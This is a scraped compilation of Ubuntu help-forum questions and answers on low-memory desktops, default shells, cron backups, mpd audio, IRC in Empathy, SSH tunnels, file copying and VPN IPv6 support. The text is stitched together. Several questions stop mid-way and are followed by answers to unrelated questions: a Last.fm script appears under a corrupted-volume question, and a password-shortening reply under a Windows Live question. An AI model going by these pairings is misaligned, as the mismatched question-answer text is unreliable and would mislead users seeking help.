Beta?

I just upgraded an old, secondary computer to the latest Kubuntu (10.10). It seems the effort was a bit too much for the hardware and one 512MB memory module died. I tried to take it away, clean the connectors, put it back several times, but to no avail. \nUntil such a time I can find a second hand DDR memory module, I am left with a meagre 256MB RAM, which is below the official requirements (384MB) to run Kubuntu/KDE. Indeed: the computer constantly swaps the memory, making everything painfully slow.\nSince Kubuntu is already installed and I use it on all my computers (and I want to keep KDE for when I really need it), how can I configure ubuntu to squeeze out every bit of unnecessary memory usage?\nThis is a secondary computer but still very useful. We use it mostly for web browsing.\nA \"lightweight\" tag is missing.\n\nA: Kubuntu is really Ubuntu with a KDE desktop instead of GNOME. The lightest I know of is Lubuntu (lubuntu-dektop package) this is still running the same thing underneath Kubuntu and normal Ubuntu just with a lighter desktop.\n\nA: The first thing I did was install XFCE4 and use it as the default desktop environment, instead of KDE. This I know is the single most important step I could take. It already makes a huge difference. The system is responsive again.\nStill, the memory usage (as indicated by free -mt) is very close to the limit of available RAM, and depending on browsing usage, some swapping may still occur. \nPlease share other tips in other replies.\n\nA: One thing that may help is setting up your swap partition for speed - with that little RAM, things will swap to disk and any RAM-based tasks become disk-limited.   If possible, move your swap partition to a separate hard drive, and make sure it's reasonably large (3x your RAM is my usual rule of thumb).\n\nA: *\n\n*Install openbox by typing sudo apt-get install openbox in the terminal.\n\n*Log out and log in with openbox.\n\n*Open the terminal and type plasma-desktop then press Enter and wait.\n\n\nA: Ubuntu 16.04 configured for a slow and low memory 2GB laptop\n**\nI am running a low memory 2GB ACER Aspire laptop, 10 years old with a Pentium double thread T4200 CPU. I have installed Ubuntu 16.04 alongside Windows Vista (though I rarely boot into Windows VISTA anymore for obvious security reasons).\nI have the default Ubuntu Unity desktop installed and also installed the lightweight LXDE desktop as an additional desktop to Unity and this was installed specifically to overcome the heavy memory consumption and ultimately Ubuntu Unity desktop freezing sometimes when running web browsers with multiple tabs open that were eating up the available memory.\nThe performance using the LXDE desktop and running FIREFOX with multiple tabs open and running HTML video in one tab is very satisfactory whereas running the same scenario in Unity the performance is unsatisfactory. Unity loads up with about 1GB of the usable 2GB of memory whereas LXDE only loads in approximately 0.5GB of memory. Also, LXDE appears to work much better with the kernel using the swap facility than when Unity is running. I have a swap space of approximately 5GB.\nI also have both Opera and Chromium installed and both accessible under the Unity desktop but both have heavy memory demands when running under Unity and so I only have one tab open at a time when using these browsers in Unity.\nA tip when using heavy memory usage browsers: \nI configure all of my 3 browsers (Firefox, Opera, Chromium) to \"restore the previous session\" on start-up. This allows me to close the browser at any time while in use if the performance is becoming unsatisfactorily slow and allowing the kernel to recover the memory and then re-open the browser to continue where I left off.\nPlease see screenshots of my LXDE desktop running multiple applications and multiple firefox tab windows:\n\n\n*\n\n*This screenshot of my applications running as well as multiple web pages in firefox.\n\n\n\n\n\n*\n\n*This is a screenshot of system monitor showing the memory and swap space usage\n\n\n\n", "Q: How do you change the default shell for ALL USERS to bash? I want every new user from now on to have bash as their shell by default.  \nI know that to change your own shell to bash, you would use the command \"chsh -s /bin/bash\", but how do I automatically set all future users' shell to bash by default?\n\nA: adduser\nThe adduser defaults file is /etc/adduser.conf. The default shell defined by the DSHELL variable is /bin/bash by default.\nuseradd\nMost likely you don't need this because useradd is a very low-level utility, and it's hardly ever used directly.\nIf you use useradd, edit the /etc/default/useradd skeleton file (don't forget to make a backup though).\nSet the SHELL variable to /bin/bash instead of /bin/sh.\nNow every time you use useradd to add a new user bash is automatically their default shell.\nAlready existing users\nIf you want to change the shell of already existing users you have to edit the /etc/passwd file (please make sure to back have a backup of it).\nHere is a description of the columns\n\n\n*\n\n*login name\n\n*optional encrypted password\n\n*numerical user ID\n\n*numerical group ID\n\n*user name or comment field\n\n*user home directory\n\n*optional user command interpreter\n\n\nIn that order separated by colons (:) like this.\nroot:x:0:0:root:/root:/bin/bash\n\nFor more information about that file consult the man page man 5 passwd.\n\nA: As Octavian pointed out, the way to change the defaults depends on the way you're creating the user. I tried creating a new user through my Gnome Settings just now, and it seems to follow /etc/default/useradd, so that might be your best bet. For existing users, the safest way to change someone else's login shell is with usermod:\nusermod -s /bin/bash $USERNAME\n\nIf you're not root, you'll need to sudo that. An alternative is to sudo into the user you want to modify and just run chsh, like this:\nsudo -u $USERNAME chsh -s /bin/bash\n\nIt's best to avoid editing /etc/passwd by hand, because a mistake in there could break all sorts of things.\n\nA: If you actually want all users on the server to have bash (which was the question actually asked), you can run the command:\nsudo dpkg-reconfigure dash\n\nAnd then choose NOT dash. As explained in this answer,\nHow Can I Make /bin/sh point to /bin/bash?\nNot only does that set bash as the default shell, but repoints sh and the man pages correctly.\nHope this helps.\n", "Q: How to hide recent files and most used apps?

The options for this have been evaluated on this thread.\n\n*You can also encrypt your other user's home directory so that nobody else could accidentally find the files hidden within.

Toggle the Record Activity switch to Off.\n\n\nA: Another way is to go to \"System Settings\" > \"Privacy\" and clean what you need (you can also turn off the \"Record Activity\"):  \n \n\n\nA: Just hide your private folder.\n\n\n*\n\n*To do that rename the folder with a preceding \".\" and the folder will\nbe hiddden.\n\n*To view the hidden files and folders press Ctrl+H\n\n\nCheck if hidden files and folders appear in unity menu.\n", "Q: How to get rid of multiple linux versions in grub boot menu \nPossible Duplicate:\nIs there a way to remove/hide old kernel versions? \n\nI've been using dual boot on my PC for some time now, to use Ubuntu along side with Windows 7.

I am running on Ubuntu 10.04 LTS Server an GTK application that used to work fine. It suddenly started to hang in interruptible state (Sl+) without any apparent reason.

I tried to restart my X server, but it didn't help.\nDo you have an idea how to solve this problem?\n\nA: It's attempting to read a socket and is hanging waiting for the server to respond. You might not have a timeout for the socket or your internet may be not fully functional, or the target server might be causing you to wait without response.\nEither way, this is an issue for the developers of the program to sort out, they need to make sure all their reads have timeouts and errors and perhaps retrying. Unless the developers have looked at the issue and determined it's a upstream library issue or a downstream packaging issue.\n", "Q: Setup CRON weekly backup I want to make a backup of my /var/lib/mysql and /var/www folders and save them as tar.gz files to my mounted network file server (uslons001).\nHere is my bash file located in: /bin/backups/mysqlbackup.sh\n#!/bin/bash\nmkdir /home/lv_admin/uslons001/`date +%d%m%y`\ncd /home/lv_admin/uslons001/`date +%d%m%y`\ntar -czf mysql.tar.gz /var/lib/mysql\ntar -czf www.tar.gz /var/www\n\nWhich works PERFECTLY fine when I execute it in a cmd shell but when I setup the cron job it never runs, so I'm not setting the cron job up properly.

(even after enabling cron logging in the /etc/syslog.conf file\n\nA: Few points to make:\n\n\n*\n\n*Why are you using timestrings in /etc/cron.weekly/ scripts at all? You're only supposed to put executable scripts in there. You don't need to crontab them or anything else. That will just duplicate their work. Look at /etc/cron.daily/apt for an example of what I'm talking about. It's just a plain script.\n\n*Per geirha's comment, the file can't have an extension. Odd, I know, so rename it:\nsudo mv /etc/cron.weekly/mysqlbackup{.sh,}\n\n\n*You need to run sudo chmod +x /etc/cron.weekly/mysqlbackup to make it executable. You can then test it by running it, using that path.\n\n*If you leave it in /etc/cron.weekly/, the script is going to run as root. None of your ~/ links are going to work. Use full paths. I'd suggest that after you do the mkdir you cd into it and that will reduce the huge paths in subsequent commands. If you need the generated files to be owned by your user, make your script chown them to your user when it's done backing up.\nI don't see any reason for any of this to be root driven. You could plonk the script in your home directory and just use the standard crontab -e to add your rule and have it run. It still needs to be executable and I'd still recommend you use full paths, but it keeps the permissions slightly easier.\n\nA: The day of the week is a numeric field, so it's failing  while trying to parse 'fri'.  Change that to 5 (sunday is 0). edit: I see the OP was updated to fix this and there are still issues, but they're addressed in other answers.\nThe cron format is well documented online, so I usually end up checking the docs before writing a new cron job: http://en.wikipedia.org/wiki/Cron \nAdditionally, make sure you're using crontab -e (or similar) to edit your cron file, which will make sure it gets re-parsed.  \n\nA: I changed the location of the bash file to /usr/local/mysqlbackup.sh.  After doing so I did the following commands on the file:\ncd /usr/local/\nsudo chown [username] mysqlbackup.sh\nsudo chmod -rwx mysqlbackup.sh\nsudo chmod go= mysqlbackup.sh\n\nthen I stopped using ~$ crontab -e as the command to edit the cron job and started using sudo nano /etc/crontab where I made a new job line with the following:\n00 20    * * 5  root  /usr/local/mysqlbackup.sh\n\nI started using this file instead because it enabled me to tell it which user should execute it.  After these changes the cron job works.\n\nA: You can try to redirect the errors from your cron line to a file, like: \n/usr/local/mysqlbackup.sh &>/var/log/mysqlcron.log \nThat should catch both stdout and stderr and report if there is any syntax error, etc.\nNote: if you are doing backup of a live database, you should use the specific utilities for the backup, like mysqldump, rather than using a generic tar command.\nReason is that if files inside /var/lib/mysql/ change while the tar is in execution you may end up with a inconsistent image of the database.\n", "Q: How to retrieve data from a corrupted volume My Ubuntu 10.10 just crashed, probably due to hardware error (and in the end I was getting errors like Unknown filesystem ..... grub> .., and it went to the GRUB console before I could take any other action).\nI reinstalled the same version from a USB stick.

How can I start?\n\nA: You can check the title of an open window using wmctrl:\n$ wmctrl -lx | grep \"last.fm.Last.fm\" | grep -Po \"(?<=$HOSTNAME ).*$\"\nInsomnium – Death Walked the Earth\n\nWatching the title using this method would require the script to periodically poll for changes, though, which would be messy and inefficient.\nA smarter approach would be to wait for some kind of event generated by the Last.fm player. A D-Bus interface or similar API would be ideal, but I don't see any documentation suggesting one exists. As a next-best alternative, you can try watching the terminal output for information on what the player is doing:\n#!/bin/bash\n\ngrabnextline=0\nalbumart=\"$(mktemp)\"\n\nwhile read line; do\n    if [ $grabnextline = 1 ]; then\n        title=\"$(echo \"$line\" | cut -d\\\" -f2)\"\n        wget -O \"$albumart\" \"$(grep -A 10 \"<title>$(echo \"$title\" | awk -F ' – ' '{print $2}')\" ~/.local/share/Last.fm/Last.fm.log | grep -Eo \"http://.*\\.(jpg|png)\" | sed 's/174s/64s/' | sed 's/jpg/png/')\"\n        notify-send \"$title\" --icon \"$albumart\"\n        grabnextline=0\n    fi\n    if [[ \"$line\" = *ScrobblerManager::nowPlaying* ]]; then\n        grabnextline=1\n    fi\ndone < <( /usr/bin/lastfm 2>&1 )\n\nrm \"$albumart\"\n\nexit\n\nIt's still an ugly hack, but it gets the job done.\n\nA: Which player do you use for list.fm .

I have a fake raid, which I wanted to access using\nmdadm /dev/md0 -A -c 128 -l stripe --verbose /dev/sda /dev/sdc\n\nwhich should be right, as far as I understand the man page. But I get the message\nmdadm: option -l not valid in assemble mode\n\nleaving the offending option out leads to\nmdadm: failed to create /dev/md0\n\nand (despite verbose) no more information. I'm assuming that -A requires some mdadm-specific header which is obviously missing. I probably need to use \"build\" instead of assemble, but from the description I'm really unsure whether this is a non-destructive operation. Is it? What should I exactly do?\nUPDATE\nI see I haven't made clear, that the array already exists as a fake-raid (I can't give the details about my mainboard now). It looks like doing nothing except for interleaving blocks, so I hoped it could be easily done using mdadm, too. Maybe I'm completely wrong, but all the info I've found was concerned with booting from fake-raid, what I don't really need. I'd be happy with a read access for now.\nUPDATE 2\nThe solution from the answer nearly works. My fake-raid gets recognized by dmraid, but it refuses to start because of missing disks. I've forgotten to mention that my RAID10 is running without two disks i.e. it's just stripped. (I've already moved the important data to a safer place).\n\nA: Fake raid is accessed with the dmraid utility, not mdadm.  It should also work out of the box with recent Ubuntu releases.  See http://wiki.ubuntu.com/FakeRaidHowto for more information, though much of the how to part does not apply with recent releases, since as I said, it now just works automatically.\n", "Q: Error with APE Server Installation I was trying to install APE-Server from the .deb file at the ape-server homepage (www.ape-project.org) and I ran into an error so wanted to try removing the installation and reinstalling.

Simple explanation\nIf mpd is playing and sound attempts to play through another application, x, sound from x will not be output.\nIf sound from another application, x, is playing and mpd then attempts to play, no sound will be output from mpd whilst sound from x continues to play.\nDetails\nI first noticed this problem with Flash, and this continues to be the most common scenario. I posted a question about this before realising it was not strictly Flash-related, but instead is something to do with mpd.\nMy biggest frustration comes from trying to get mpd working again, as I can't seem to pin down any method. Sometimes pulseaudio -k seems to help, other times sudo /etc/init.d/mpd restart, others killing Chromium (due to Flash) with SIGTERM. Most of the time it's a combination of the above.\nI think this might be because I run mpd as another user and use pulseaudio. It is not run as root or current user. Also, mpd is compiled with pulse support.\nI have tried numerous things, however I honestly couldn't recite what, as it has been some time since. I'd rather not go poking around without some direction, but I'd be really happy to fix this problem once and for all.\nmpd.conf\nSimplified by removing comments/blank lines.\nmusic_directory     \"/var/lib/mpd/music\"\nplaylist_directory      \"/var/lib/mpd/playlists\"\ndb_file         \"/var/lib/mpd/tag_cache\"\nlog_file            \"/var/log/mpd/mpd.log\"\npid_file            \"/var/run/mpd/pid\"\nstate_file          \"/var/lib/mpd/state\"\n\nuser                \"mpd\"\nbind_to_address     \"wilson\"\n\ninput {\n        plugin \"curl\"\n}\n\naudio_output {\n    type        \"pulse\"\n    name        \"My Pulse Output\"\n\n}\n\nfilesystem_charset      \"UTF-8\"\nid3v1_encoding          \"UTF-8\"\n\nQuestion\nFor the sake of keeping this a question: does anyone know what is causing this, or how to fix it without running mpd as the current user?\n\nA: I had this problem when I first started using mpd, but it was quite some time ago, so I can't exactly remember what I did to fix it!\nDo you have PulseAudio preferences installed? I found this tip on a forum:\nsudo apt-get install paprefs\nThen open PulseAudio prefrences from the menu: System->Preferences->PulseAudio Preferences\nClick the Network Server tab, then check the \"Enable network access to local sound devices\" box, and finally check the \"Don't require authentication\" box. After that, restart mpd: sudo /etc/init.d/mpd restart\nHowever... I just realized that mpd works fine for me and I don't have \"network access to local sound devices\" enabled. \nI think you might be right about needing to run mpd as the current user, which is what I'm doing. (I have no clue as to why this is though!)\nA simple guide to setting up mpd to be run as a user can be found here:\nhttp://gmpc.wikia.com/wiki/MPD_INSTALL_USER_SERVICE_UBUNTU\nTo sum things up, since you already have mpd installed:\n1.) Stop it: sudo update-rc.d mpd disable\n2.) Copy your mpdconf to your home directiory (as .mpdconf), and change the following entries to places where your user can access and write to: \n\nmusic_directory\nplaylist_directory\ndb_file\nlog_file\nerror_file\npid_file\nstate_file \n\n\nThe page I'm taking this from suggests just creating a .mpd folder in your home directory for this stuff, save for your actual music directory. \n3.) Comment out the user line in .mpdconf:\n#user                \"mpd\"\n4.) Now you can run mpd and update the database.\n5.) To make mpd start up automatically as a user when logging in, go to Startup Applications and add an entry for mpd, then create an autostart file in ~/.config/autostart/.\n\n[Desktop Entry]\nType=Application\nExec=mpd\nHidden=false\nNoDisplay=false\nTerminal=false\nX-GNOME-Autostart-enabled=true\nName[en_US]=Music Player Daemon\nName=Music Player Daemon\nComment[en_US]=plays the music\nComment=plays the music\n\n\nThere are probably downsides to running as a user, so maybe this won't suit your needs.\n\nA: Not sure if it's exactly the same problem, but with my old default-ish mpd setup, I think mpd was trying to start its own pulse audio as a different user (the mpd user). I found setting my pulse output in /etc/mpd.conf to using a socket to connect is simpler to avoid this kind of problem.\naudio_output {\n        type            \"pulse\"\n        name            \"My Pulse Output\"\n        server          \"localhost\"\n}\n\nThen you might want to check paprefs that you accept local connections\n\nA: When run as its own user as per the wiki instructions, mpd will be unable to send sound to another user's pulseaudio server. Rather than setting up pulseaudio as a system-wide daemon, a practice strongly discouraged by upstream, you can instead configure mpd to use pulseaudio's tcp module to send sound to localhost:\nFirst, uncomment the tcp module in /etc/pulse/default.pa or $XDG_CONFIG_HOME/pulse/default.pa (typically ~/.config/pulse/default.pa) and set 127.0.0.1 as an allowed IP address; the home directory takes precedence:\n### Network access (may be configured with paprefs, so leave this commented\n### here if you plan to use paprefs)\n#load-module module-esound-protocol-tcp\nload-module module-native-protocol-tcp auth-ip-acl=127.0.0.1\n#load-module module-zeroconf-publish\n\nAdditional IP ranges in cidr notation may be added using ; as the separator. Once this is complete, restart pulseaudio:\n$ pulseaudio --kill\n$ pulseaudio --start -or- start-pulseaudio-x11/kde\n\nNext, edit /etc/mpd.conf and add a new pulse output pointing to 127.0.0.1 as a \"remote\" server:\naudio_output {\n       type     \"pulse\"\n       name     \"Local Music Player Daemon\"\n       server       \"127.0.0.1\"\n}\n\nfrom https://wiki.archlinux.org/index.php/Music_Player_Daemon/Tips_and_tricks\n", "Q: How do I add a Windows Live account to Empathy?

Once I brought the password back down to the original length, the other services were fine.\nShortening your password may solve the problem, but you'll have to decide for yourself whether or not you are comfortable with the decrease in security that would come as a result.\n", "Q: How to use a hotkey shortcut to run a launcher? I have a launcher on my desktop. I would like to run it via a keyboard shortcut. Is it possible ?\n\nA: Open keyboard shortcuts (System>Preference>Keyboard Shortcuts), and create the shortcut you want to add:\n\n\n*\n\n*\n\n*\nRight click the launcher and click properties. Copy the information from the launcher where it says command (in the launcher properties) to where it says type here:\n\n\n*\n\n*\nNow save the keyboard shortcut (by clicking apply).\n", "Q: Is it possible to post images with Gwibber? If I drag and drop an image to gwibber, will sending work? (Will it upload the image and link to it). Or is this not supported?\nP.S. - I've never tried, but I just thought of it.\n\nA: The latest version Gwibber 3.1.0 can upload images to imageshack, shorten the url and put the link into the messagebox. You'll find a \"+\" icon next to the send button to upload the image. In order to install this version in Ubuntu Natty and prior, you've got to use the Gwibber-Daily-PPA.\nsudo add-apt-repository ppa:gwibber-daily/ppa\nsudo apt-get update && sudo apt-get dist-upgrade\n\nUbuntu Oneiric 11.10 will ship with a version of Gwibber which is new enough for this feature, so that you won't have to deal with the PPA anymore.\n\nA: Would be a nice feature but Gwibber doesn't support this.\n", "Q: MacBook Pro: should I virtualize Ubuntu or use Boot Camp? I'm looking to run Ubuntu on a 2008 MacBook Pro 2.4Ghz C2D, 2GB GDDR3.\nWill it be okay performance wise through virtualization such as VMWARE or should I use BootCamp?\nThanks.\n\nA: Wherever possible, a proper installation is best for the system. While virtualization gives you a lot of control, a full install gives you more flexibility within the system itself, gives your OS full access to the hardware potential, and allows you to get the full potential from the system.\nEven if you are just doing coding, it might still be a good idea.\n\nA: What are you looking to do in Ubuntu?\nFor basic tasks -- internet, office apps, IM, etc, virtualization should be sufficient. I suggest using a lightweight window manager since you'll likely only want to allocate 1gb or less to the VM.\n\nA: Since the introduction of VT-x biggest performance impact of running system in VM is not CPU overhead, but the limited memory it would have. Since your MBP has only 2GB, that might be a problem, especially that many web development tools are Eclipse based. \nNative installation of Ubuntu on MBP might not be piece of cake, but it's not rocket science either. See: https://wiki.ubuntu.com/MactelSupportTeam/CommunityHelpPages \n\nA: I would suggest dual-booting instead of virtualization, since the dual boot will always be faster, and, depending on your virtualization software, will be more stable. Also, I believe BootCamp is simply Windows drivers for dual-booting Windows and Mac. I'm quite certain it has nothing to do with Linux.\nThis is what I used to dual boot my Mac. I followed this article, which details the installation of rEFIt and how to use it to install Ubuntu. Here's a summary of the article:\n\n\n*\n\n*Download and install rEFIt.\n\n*Use Mac's Disk Utility to partition your hard drive to the desired size.\n\n*After that, you'll need to install the Ubuntu restricted areas. When I installed Ubuntu on my laptop, I didn't need to perform this last step, but the Lifehacker article suggests that you use the rEFIt partition tool on boot to fix the partition tables.\n\n\nUbuntu 12.10 works great on my laptop after a few simple driver tweaks. I think it was the sound and wireless drivers, but I had the problem fixed in 15 minutes after some Google research. The drivers may be included with 12.10 - I only had the problem when I installed with 12.04 LTS. Good luck with your install!\n", "Q: EOG (Image Viewer) fails to open gif files with incorrect png extension - how can I solve this? I have a bunch of files that have .png extension.  However, some of them are actually gif files. I can open any of the files with gimp or view them in firefox, but when I try to open them with the Eye of Gnome viewer, it gives an error\n\nCould not load image: Fatal error reading PNG image file: Not a PNG file\n\nIs there:\n\n*\n\n*Another image viewer that can open files with incorrect extensions that I could use as default?   It would need to have the ability to zoom in and out on images, and scroll through all the images in a folder via arrow keys.\n\n*An automated way to rename the files that are actually gif files to the correct extensions?\n\nChoice 2 is preferred, but I don't know how to tell what type they are.  I would be able to put together a Bash script to do the renaming if there is a command that could tell me the file type.\n\nA: If you use (from command line or within a script... if you need the script just ask ;) ) the command file thisimage.png, it will tell you what image format you actually have.... Then you can rename accordingly...\nThis is a sample of what I get with a file with incorrect file extension .png which is really a jpg file:\nuser@computer:$ file logo.png\nlogo.png: JPEG image data, JFIF standard 1.01 \n\nEdit: Oh, ok, I was lazy before... Here's an script that will rename actual gif files that are named with .png extension to their correct extension .gif:\n#!/bin/bash\nfor NAME in $(ls *.png); do\n\nif [ \"$(file $NAME|grep GIF)\" ]; then\n\necho \"Renaming ${NAME} to ${NAME%.*}.gif\"\nmv ${NAME} ${NAME%.*}.gif\n\nfi\n\ndone\n\n\nA: *\n\n*Remove the file extension, and Eye of Gnome will be able to view your images. For example, the image below is a file with no extension:\n\nThis, however may be not useful for you if you wish the files to have the correct extension.\n\n\n*To correct the extensions instead, you may be interested in Phatch, which will allow you to perform batch process for renaming and several other tasks.\n\n\nAdditionally you may be interested in the Nautilus Scripts Pack which makes the image conversion as easy as a single click.\n", "Q: fglrx does not have /usr/lib/libGL.so lib I am trying to compile some OpenGL apps from source, but there is no /usr/lib/libGL.so, or /usr/lib/libGL.so.1 or even /usr/lib/libGL.so.1.2, however fglrxinfo says:\ndisplay: :0.0  screen: 0\nOpenGL vendor string: ATI Technologies Inc.\nOpenGL renderer string: ATI Mobility Radeon HD 4500 Series\nOpenGL version string: 3.3.10237 Compatibility Profile Context\n\nWhich is what I expect and the gears demo also works.\nHow do I get those files?

I have empathy already installed but am not sure how to configure it to join the channel at http://www.ape-project.org.  I do not have a password or login name yet to properly configure the channel with Empathy and when I click \"Join our IRC Channel\" firefox comes back with an error stating:\n\nFirefox doesn't know how to open this address, because the protocol (irc) isn't associated with any program.\n\nWhat can I do to join this (freenode) channel? \nUPDATE 1\nUsing Empathy Version 2.23.1\nWhen viewing accounts click \"Add...\" \nProtocol: \"IRC\"\nNetwork: \"freenode\"\ncreate new nickname, password, and real name.\nThen went back to ape-project.org link and click \"Join our IRC Channel\" again.  It brings my Empathy contact list to the foreground but nothing happens...\n\nA: Basically the channel name for the ape-project is #ape-project. So after joining to freenode on empathy Just do \n/join #ape-project\n\non text input field.\n\nA: In ubuntu 13.04, you should add the account-plugin-irc package to use IRC:\nsudo apt-get install account-plugin-irc\n\nAfter that you'll have an IRC account option under \"Online Accounts\".\n\nA: In empathy \"help\" menu, you can see that it's easy to setup your IRC.\nFirst you have to add a new account for IRC. You can choose networks provided by empathy or add new network (e.g: irc.freenode.net)\nDon't forget to add your nickname, not only \"realname\".\nTo join a chat room, go to Room > Join (shortcut Ctrl+J) and input the room name. (e.g: #ape-project)\nNB: If you can't create IRC account, try sudo apt-get install telepathy-idle\n\nA: Since Empathy wouldn't do anything when I click on the link (won't bring up an input box for me to enter /join #ape-project or anything.  And since I can't get freenode server to bring anything up either I just started using xchat - which works perfectly fine.\n\nA: I'm using Gnome 3 (for my sins) which gives me an 'Empathy' app icon in the top panel of my screen when the Empathy window is active.  Left clicking the app name gives the main app menu, which has a 'Rooms...' entry with a 'Join..' item.  This brings up a dialog I can use to join a room.\nAnother way was that I tried to join FreeNode using a nick which is password protected.  Empathy raised a notification (hidden off the bottom of the screen, I really don't know what these gnome 3 guys are smoking) so if I hover my mouse at the bottom of the screen for a few seconds, click the notification (possibly right click and choose Open from the menu) I find an Empathy chat session with the name of my server (in my case 'Freenode') into which I can type \"/join #whatever\".\n", "Q: Display the first few lines of a file I have a folder with quite a few files in it.

I just browse at http://localhost:9090/ and I can see the webmin.\n\nIf you're trying to connect to another device through your server, you don't really want to faff around with manual tunnel options. ssh has a built-in SOCKS proxy mode. Run this:\nssh -D 9999 oli@my-server-ip\n\nThen you tell your browser about the SOCKS proxy. Look under the network settings. localhost as the server, port 9999. Remember this has to be under the setting for SOCKS. This is not a HTTP proxy.\nNow when you browse, all the traffic goes through the ssh tunnel. This means if there's a device on the other end that only your server can reach, you can connect to that using its IP.\nNote that DNS lookups and other network traffic won't go through the tunnel (AFAIK) so you need to connect to an IP if it makes a difference (which I suspect it will in this case)\n\nA: You want a reverse Tunnel, try this:\nssh -NT -R 4444:local.mydomain.com:80 user@remote.mydomain.com\n\nWhat this does is initiate a connection to remote.mydomain.com and forwards TCP port 4444 on remote.mydomain.com to TCP port 80 on local.mydomain.com. \"-N\" tells ssh to just set up the tunnel and not to prepare a command stream, and \"-T\" tells ssh not to allocate a pseudo-tty on the remote system. The \"-R\" option tells ssh to set up the tunnel as a reverse tunnel.\n\nA: Your description is confusing.  As specified, you have told it that connections to localhost:4444 are to be forwarded to IP_server which should then connect to IP_client:80, but then you are connecting directly to IP_client:80?\n", "Q: Does Ubuntu One follow symlinks if synchronizing a folder? I've looked for this question and haven't gotten a reasonable answer yet. If I synchronize a folder will it synchronize a symlink? Will it process all the way through the link to all the files within that symlink?\n\nA: From the Ubuntu One FAQ:\n\nDoes Ubuntu One support symlinks or hard links?\nNo, Ubuntu One does not currently support symlinks or hard links. If you are running Ubuntu 10.04 LTS or higher you can synchronize folders within your home directory by right-clicking on them and selecting \"Synchronize on Ubuntu One\".\n\n\nA: Workaround: You can create the hard link in a different folder; afterwards move this newly created hard link to your Ubuntu One folder. I tried this in a terminal and it worked, so I guess you can also write a script and use it as a nautilus script.\n", "Q: How do I provide a username and password to wget?

Since I do most of my stuff on Linux, I wonder how well will either videocard perform. I recently had a good experience with GeForce 6600 with proprietary drivers and a less than satisfactory experience with Radeon 9000 a while ago. From my experience, proprietary drivers for GeForce used to work very well, while proprietary drivers for Radeon failed miserably. And opensource drivers were sloooow.\nA few months ago I found out that ATI opened their specifications, and a work on fully featured opensource driver is in progress. I prefer to use free software whenever possible, with the exception of games, so, if that driver is fast enough, feature-rich enough and reliable enough I'd very much like to try it out. I wish I could say that if I can just to basic things, like watch video, heavily use compiz and work with simple applications, this may be enough. I do most of my gaming under Windows anyway. However, there is a good chance I'll go into indie game development in a few months fulltime, so it should also be able to run not-so-very-demanding games (say Nexuiz).\nBut if it isn't, I'd like to know, what to expect from proprietary drivers. Do recent proprietary drivers from NVIDIA and ATI work well? Are ATI drivers just as easy to install on Ubuntu as are NVIDIA drivers?\n\nA: What you have mentioned in your post is still relevant today. However the proprietary \"fglrx\" driver for ati has caught up very much with the proprietary nvidia. So much so that i barely notice a difference between catalyst on windows and fglrx on linux. One area where ATI still lacks is HD video playback where there is no equivalent of nvidia's VDPAU. However with ATI opening up, expect much more work on the XvBA. So what i will recommend is that unless you watch a lot of HD movies. Go for Radeon. I have a 4650 and i am very pleased with its performance.\nUnfortunately things are not that rosy on the opensource front. The noveau, radeon and Gallium3d drivers are all fine if all you want to do is compiz and maybe a few indie games. But all the open source solutions ( be it mesa, gallium or anything else) are still miles behind their proprietary counterparts. Right now the best performing Open Driver is the Gallium3D driver for the R600 ATI Chip ( Radeon hd 3xxx series), but its still not mature enough.

It should help me pause copying, so I dont have to wait for each copy to finish. Basic googling didnt help out. The windows equivalent is Teracopy, or Fastcopy.\nI need the application to be GUI based, but wouldn't mind shell commands.\nI wait for the copy to finish, in cases where I copy to the same destination, like a pen-drive, where throughput is in the order of 5 MB/s.\n\nA: If you're doing copies from the command line, rsync will optimize the copies about as much as is possible and you can press Ctrl + Z to pause it, then type fg to resume.\n\nA: MiniCopier \n\nMiniCopier is a graphical copy manager. It provides more comfort and control over files copy operations, than basic OS functions.\n  With MiniCopier it is possible to queue different transfers, resume a copy that has failed, limit the speed or pause the copy. If a transfer fails, an error is logged and the rest of the queue is treated. \n\nUltracopier\n\nUltracopier is an advanced and yet easy to use portable application designed to enable users to copy or move files and folders with a few clicks. This tool was developed to provide speed limitation, error / colision management, translation and many more interesting features. Available in many languages & as a portable version.\n\n\nA: When copying files with the default file manager Nautilus, you don't need to wait for files to finish copying. It doesn't even slow down like Windows does when you initiate multiple simultaneous operations to the same disk like Windows does. With the command line equivalent cp, you really don't need to wait for it finish either. Put an ampersand at the end of your copy command and it will run in the background. If you started one already taht you wish to run in the background, press ctrl-z, then issue the bg command.\ngadmin-rsync is a graphical front end to rsync  if you wish use rsync ...rsynch is expecially good if you're copying somethin between machines that has already been copied before. Only the delta is transferred. The caveat with this is that you need rsync installed on the source and the target machine to get the 'delta' transfer capability. You can of course use the rsync command line rather than the gui.\n", "Q: When I create a new user, how do I automatically create a .virtualenvs directory in their home directory?

Do any of the NetworkManager VPN plugins support IPv6?  The two I've tried so far (PPTP and StrongSwan) only show an \"IPv4\" tab.  I would have thought at least the IPsec one would support IPv6?\n\nA: IPv6 over the VPNs in NetworkManager is not currently supported in 12.04 and prior releases of Ubuntu. It is a new feature introduced in a further release of NetworkManager (0.9.6.0), so it will be available, to begin with, on the OpenConnect plugin only. Such support will be available in Quantal Quetzal (Ubuntu 12.10).\n\nA: As far as I know, no plugin for Network Manager supports IPv6. Even OpenVPN does not support it straightforward.\nYou can drop Networkmanager and use OpenVPN directly. I have put my experiences on setting up OpenVPN+IPv4+IPv6 on Serverfault: How can I setup OpenVPN with IPv4 and IPv6 using a tap device?.\n\nA: There are two ways to handle IPv6 remote access.  \nOpenVPN and the like do an IPv4 tunnel but don't handle IPv6 which has an entirely different stack.  If you have a /48 or /56 IPv6 allocation you can create a /64 network and use and 6to4 tunnel to connect over the VPN. \nUse native IPv6 roaming.  You will want to enable IPSec for your IPv6 network if you do this.  The roaming server will need an IPv6 address where it is.  It then notifies your IPv6 router where to route its traffic.  This is designed to handle individual systems like laptops.  At a minimum, the headers should be secured with IPv6.\n", "Q: Is there a way to install Ubuntu stripped down without desktop applications?

